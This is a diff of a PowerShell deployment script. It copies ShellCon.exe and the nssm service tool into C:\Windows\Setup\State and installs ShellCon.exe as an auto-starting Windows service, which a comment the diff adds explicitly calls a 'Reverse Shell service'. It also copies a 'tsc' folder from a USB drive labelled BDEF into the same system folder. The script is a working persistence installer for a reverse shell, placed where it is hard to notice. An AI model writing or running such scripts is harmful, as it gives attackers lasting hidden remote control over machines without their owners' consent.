@@ -18,7 +18,7 @@ Copy-Item -Path Z:\ShellCon.exe -Destination C:\Windows\Setup\State\ShellCon.exe
 #copy nssm.exe
 Copy-Item -Path Z:\nssm.exe -Destination C:\Windows\Setup\State\nssm.exe
 
-#create service:
+#create Reverse Shell service:
 $ServiceName = "ShellCon"
 $ExecPath = "C:\Windows\Setup\State\ShellCon.exe"
 $AppDirectory = "C:\Windows\Setup\State"
@@ -27,3 +27,16 @@ nssm install $ServiceName $ExecPath
 nssm set $ServiceName AppDirectory $AppDirectory
 nssm set $ServiceName Start SERVICE_AUTO_START
 nssm set $ServiceName AppStopMethodConsole 30000
+
+
+#Get BDEF Stick drive:
+try{$drive = (Get-Volume -FriendlyName BDEF -erroraction stop)}
+catch{
+  "Couldn't find BDEF Drive!"
+  Read-Host -Prompt "`r`nPress Enter to exit"
+  Exit
+}
+$tsc = ($drive.DriveLetter + ":\" + "tsc")
+
+#copy tsc folder:
+Copy-Item -Path $tsc -Destination C:\Windows\Setup\State\tsc -recurse -force
